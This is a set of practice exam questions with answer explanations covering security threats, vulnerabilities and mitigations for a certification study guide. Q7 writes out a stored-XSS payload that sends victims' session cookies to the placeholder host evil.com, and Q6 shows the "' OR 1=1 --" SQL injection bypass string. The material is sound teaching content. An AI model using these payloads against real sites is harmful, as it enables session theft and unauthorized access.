# Domain 2 — Threats, Vulnerabilities, and Mitigations (22%)

### Q1. Threat Actor — Nation-State

A company in the defense sector discovers a sophisticated intrusion that has been active for 14 months. The attackers used zero-day exploits, custom malware, and showed extensive knowledge of the target's internal systems. Which threat actor type is MOST likely responsible?

- A) Hacktivist
- B) Unskilled attacker (script kiddie)
- C) Nation-state
- D) Insider threat

<details>
<summary>Answer</summary>

**C) Nation-state**

Nation-state actors are characterized by advanced capabilities, significant resources, patience (long dwell times), use of zero-day exploits, and targeting of defense/government sectors. The 14-month dwell time and custom tooling indicate a well-funded, persistent adversary.
</details>

---

### Q2. Social Engineering — Phishing vs. Vishing

An employee receives a phone call from someone claiming to be the company's IT helpdesk, asking them to provide their VPN password to resolve a "critical account issue." Which social engineering technique does this describe?

- A) Phishing
- B) Vishing
- C) Smishing
- D) Whaling

<details>
<summary>Answer</summary>

**B) Vishing**

Vishing (voice phishing) uses phone calls to trick victims into revealing sensitive information. Phishing uses email. Smishing uses SMS/text messages. Whaling targets high-level executives specifically.
</details>

---

### Q3. Malware — Ransomware

A user opens an email attachment and shortly after, all files on their workstation and mapped network drives are encrypted. A message demands payment in cryptocurrency for the decryption key. What type of malware has infected the system?

- A) Trojan
- B) Worm
- C) Ransomware
- D) Rootkit

<details>
<summary>Answer</summary>

**C) Ransomware**

Ransomware encrypts victim files and demands payment for the decryption key. Key indicators: file encryption, ransom note, cryptocurrency payment demand. Unlike worms, ransomware doesn't self-replicate across networks (though some variants have worm-like spreading capabilities).
</details>

---

### Q4. Password Attack — Brute Force vs. Dictionary

An attacker uses a tool that systematically tries every possible combination of characters against a login portal. Which password attack is this?

- A) Dictionary attack
- B) Brute-force attack
- C) Password spraying
- D) Credential stuffing

<details>
<summary>Answer</summary>

**B) Brute-force attack**

A brute-force attack tries every possible combination of characters. A dictionary attack uses a list of common words/passwords. Password spraying tries a few common passwords against many accounts. Credential stuffing uses stolen credentials from other breaches.
</details>

---

### Q5. Indicators of Malicious Activity — Impossible Travel

A SIEM alert indicates that a user authenticated from New York at 2:00 PM and then from London at 2:15 PM. Which indicator of compromise does this represent?

- A) Concurrent session usage
- B) Account lockout
- C) Impossible travel
- D) Resource consumption anomaly

<details>
<summary>Answer</summary>

**C) Impossible travel**

Impossible travel occurs when a user authenticates from two geographically distant locations within a timeframe that makes physical travel impossible. This strongly indicates compromised credentials being used from a different location.
</details>

---

### Q6. SQL Injection

A web application displays the following error after a user enters `' OR 1=1 --` in a login form: `SQL syntax error near 'OR 1=1'. Which vulnerability has been identified?

- A) Cross-site scripting (XSS)
- B) SQL injection (SQLi)
- C) Cross-site request forgery (CSRF)
- D) XML injection

<details>
<summary>Answer</summary>

**B) SQL injection (SQLi)**

SQL injection occurs when user input is passed directly to a SQL query without proper sanitization. The `' OR 1=1 --` payload is a classic SQLi test that attempts to bypass authentication by making the WHERE clause always true.
</details>

---

### Q7. Cross-Site Scripting (XSS)

An attacker injects `<script>document.location='http://evil.com/steal?c='+document.cookie</script>` into a web forum post. When other users view the post, their session cookies are sent to the attacker. Which attack is this?

- A) SQL injection
- B) Stored cross-site scripting (XSS)
- C) Cross-site request forgery (CSRF)
- D) Buffer overflow

<details>
<summary>Answer</summary>

**B) Stored cross-site scripting (XSS)**

Stored (persistent) XSS injects malicious scripts that are permanently stored on the target server (e.g., in a forum post). When users view the page, the script executes in their browser. This differs from reflected XSS, which requires the victim to click a crafted link.
</details>

---

### Q8. Vulnerability — Zero-Day

A security researcher discovers a critical vulnerability in a widely used web server that has no available patch or vendor acknowledgment. What is this type of vulnerability called?

- A) Known vulnerability
- B) Zero-day vulnerability
- C) Legacy vulnerability
- D) Misconfiguration

<details>
<summary>Answer</summary>

**B) Zero-day vulnerability**

A zero-day vulnerability is unknown to the vendor and has no available patch. The vendor has had "zero days" to address it. These are particularly dangerous because no defensive signature or patch exists.
</details>

---

### Q9. On-Path Attack (Man-in-the-Middle)

An attacker positions themselves between a client and a server, intercepting and potentially modifying communications between the two parties without their knowledge. Which type of attack is this?

- A) Replay attack
- B) On-path (man-in-the-middle) attack
- C) DNS poisoning
- D) ARP spoofing

<details>
<summary>Answer</summary>

**B) On-path (man-in-the-middle) attack**

An on-path attack (previously called MITM) involves an attacker intercepting communications between two parties. The attacker can eavesdrop, modify, or inject data. ARP spoofing and DNS poisoning are techniques often used to enable an on-path attack, but the attack itself is the interception.
</details>

---

### Q10. Buffer Overflow

A penetration tester sends more data than an application's input buffer can hold, causing the application to crash and potentially allowing arbitrary code execution. Which vulnerability is being exploited?

- A) Race condition
- B) Buffer overflow
- C) Integer overflow
- D) Memory leak

<details>
<summary>Answer</summary>

**B) Buffer overflow**

A buffer overflow occurs when more data is written to a buffer than it can hold, potentially overwriting adjacent memory. This can cause crashes or allow attackers to execute arbitrary code by overwriting the return address on the stack.
</details>

---

### Q11. Mitigation — Network Segmentation

After a ransomware incident where malware spread from a user workstation to critical servers, a security team implements VLANs to separate user workstations from server networks. Which mitigation technique is this?

- A) Patching
- B) Network segmentation
- C) Access control lists
- D) Encryption

<details>
<summary>Answer</summary>

**B) Network segmentation**

Network segmentation divides a network into isolated segments (using VLANs, subnets, or firewalls) to limit lateral movement. If one segment is compromised, the attacker cannot easily reach other segments.
</details>

---

### Q12. DDoS Attack

A company's public website becomes unreachable. Investigation reveals millions of requests per second from thousands of different IP addresses worldwide, overwhelming the web server. Which attack type does this describe?

- A) SYN flood
- B) Distributed denial-of-service (DDoS)
- C) DNS amplification
- D) Smurf attack

<details>
<summary>Answer</summary>

**B) Distributed denial-of-service (DDoS)**

A DDoS attack uses many source systems (a botnet) to flood a target with traffic, making it unavailable. SYN flood, DNS amplification, and Smurf attacks are specific DDoS techniques, but the scenario describes the general DDoS pattern of distributed sources overwhelming a target.
</details>

---

### Q13. Insider Threat

A disgruntled IT administrator who has submitted their resignation is discovered copying the entire customer database to a personal USB drive on their last day. Which threat type does this represent?

- A) Nation-state actor
- B) Insider threat
- C) Shadow IT
- D) Organized crime

<details>
<summary>Answer</summary>

**B) Insider threat**

An insider threat is a current or former employee, contractor, or partner who misuses their authorized access to harm the organization. This scenario describes data exfiltration by a disgruntled insider with legitimate access.
</details>

---

### Q14. Trojan

A user downloads what appears to be a legitimate PDF viewer from an unofficial website. After installation, the application works as expected but also installs a hidden backdoor that allows remote access. Which malware type is this?

- A) Virus
- B) Worm
- C) Trojan
- D) Adware

<details>
<summary>Answer</summary>

**C) Trojan**

A Trojan disguises itself as legitimate software but carries a hidden malicious payload. Unlike viruses and worms, Trojans do not self-replicate — they rely on the user to install them.
</details>

---

### Q15. Credential Stuffing

An attacker obtains a database of usernames and passwords from a breached e-commerce site and uses automated tools to try these same credentials on banking, email, and social media sites. Which attack is this?

- A) Password spraying
- B) Brute-force attack
- C) Credential stuffing
- D) Rainbow table attack

<details>
<summary>Answer</summary>

**C) Credential stuffing**

Credential stuffing uses stolen username/password pairs from one breach to attempt login on other services, exploiting password reuse. Password spraying tries common passwords against many accounts. Brute force tries all possible combinations.
</details>

---

### Q16. Supply Chain Attack

A software company's build server is compromised, and malicious code is injected into a software update that is digitally signed and distributed to thousands of customers. Which attack vector does this represent?

- A) Watering hole attack
- B) Supply chain attack
- C) Drive-by download
- D) Typosquatting

<details>
<summary>Answer</summary>

**B) Supply chain attack**

A supply chain attack compromises a trusted vendor's software development or distribution process. The SolarWinds attack is a real-world example — attackers inserted malicious code into a legitimate software update.
</details>

---

### Q17. Hardening

A system administrator disables unnecessary services, removes default accounts, applies security patches, and configures the host firewall on a new server before placing it in production. Which security practice does this describe?

- A) Baselining
- B) Hardening
- C) Decommissioning
- D) Sandboxing

<details>
<summary>Answer</summary>

**B) Hardening**

System hardening reduces the attack surface by removing unnecessary software and services, changing defaults, applying patches, and configuring security controls. This should be done before any system is deployed to production.
</details>

---

### Q18. DNS Poisoning

An attacker modifies DNS cache entries on a recursive DNS server so that queries for a bank's website resolve to the attacker's server hosting a fake login page. Which attack type does this describe?

- A) ARP spoofing
- B) DNS poisoning (cache poisoning)
- C) URL redirection
- D) BGP hijacking

<details>
<summary>Answer</summary>

**B) DNS poisoning (cache poisoning)**

DNS poisoning corrupts DNS cache entries to redirect users to malicious sites. The attacker doesn't need to compromise the target website — they corrupt the name resolution process so users unknowingly connect to a fake site.
</details>

---

### Q19. Privilege Escalation

After compromising a standard user account, an attacker exploits a vulnerability in a local service to gain SYSTEM-level privileges on a Windows server. Which attack technique does this describe?

- A) Lateral movement
- B) Privilege escalation
- C) Persistence
- D) Credential harvesting

<details>
<summary>Answer</summary>

**B) Privilege escalation**

Privilege escalation is gaining higher-level permissions than originally granted. Vertical escalation goes from a lower to higher privilege level (user → admin). Lateral movement is moving between systems at the same privilege level.
</details>

---

### Q20. Threat Vector — Removable Media

A security policy prohibits the use of USB flash drives on all workstations. Which threat vector is this policy designed to mitigate?

- A) Wireless attack surface
- B) Removable media
- C) Email-based threats
- D) Supply chain risks

<details>
<summary>Answer</summary>

**B) Removable media**

USB drives and other removable media are a threat vector for introducing malware, exfiltrating data, or bridging air-gapped networks. Disabling USB ports or blocking removable media mitigates this vector.
</details>

---

### Q21. Replay Attack

An attacker captures a valid authentication token transmitted over the network and later retransmits it to gain unauthorized access to a system. Which attack does this describe?

- A) Session hijacking
- B) Replay attack
- C) Pass-the-hash
- D) Credential stuffing

<details>
<summary>Answer</summary>

**B) Replay attack**

A replay attack captures and retransmits valid authentication data (tokens, tickets, hashes) to gain unauthorized access. Defenses include timestamps, nonces, and session tokens that expire after use.
</details>

---

### Q22. Watering Hole Attack

An attacker identifies that employees of a defense contractor frequently visit a specific industry news website. The attacker compromises that website and installs malware that targets visitors matching the contractor's IP range. Which attack type is this?

- A) Spear phishing
- B) Watering hole
- C) Drive-by download
- D) Pharming

<details>
<summary>Answer</summary>

**B) Watering hole**

A watering hole attack compromises a website that the target group is known to visit. Rather than attacking the target directly, the attacker "poisons the watering hole" where targets naturally gather.
</details>

---

### Q23. Race Condition — TOCTOU

An application checks a user's permissions, then performs an action based on those permissions. An attacker exploits the gap between the check and the action to elevate their privileges. Which vulnerability type is this?

- A) Buffer overflow
- B) Race condition (TOCTOU)
- C) Improper input validation
- D) Insecure direct object reference

<details>
<summary>Answer</summary>

**B) Race condition (TOCTOU)**

A Time-of-Check to Time-of-Use (TOCTOU) race condition exploits the gap between when a system checks a condition and when it acts on the result. The attacker changes the state between the check and the use.
</details>

---

### Q24. Mitigation — Patching

A critical remote code execution vulnerability is discovered in an organization's email server. The vendor has released a patch. What is the MOST appropriate first response?

- A) Immediately apply the patch to the production email server
- B) Test the patch in a staging environment, then apply to production through change management
- C) Wait 30 days to see if the patch causes issues for other organizations
- D) Disable the email server until the vulnerability is resolved

<details>
<summary>Answer</summary>

**B) Test the patch in a staging environment, then apply to production through change management**

Even critical patches should be tested before production deployment to avoid introducing new issues. However, testing should be expedited for critical vulnerabilities. Proper change management ensures documentation and rollback capability.
</details>

---

### Q25. Impersonation — Pretexting

An attacker calls an employee pretending to be a vendor's support technician, claiming they need remote access to the employee's workstation to perform an emergency firmware update. Which social engineering technique is being used?

- A) Tailgating
- B) Pretexting
- C) Baiting
- D) Shoulder surfing

<details>
<summary>Answer</summary>

**B) Pretexting**

Pretexting involves creating a fabricated scenario (pretext) to trick the victim into providing information or access. The attacker builds a believable story — in this case, posing as a vendor technician with an urgent need.
</details>

---

### Q26. Malicious Update

An organization discovers that a recent firmware update for their IoT devices, downloaded from the manufacturer's compromised update server, contained a backdoor. Which threat vector and vulnerability type does this represent?

- A) Phishing; application vulnerability
- B) Supply chain; malicious update
- C) Removable media; firmware exploit
- D) Wireless; misconfiguration

<details>
<summary>Answer</summary>

**B) Supply chain; malicious update**

A malicious update delivered through a compromised vendor update server is both a supply chain attack and a malicious update vulnerability. The trust relationship with the vendor's update mechanism is exploited to distribute compromised firmware.
</details>

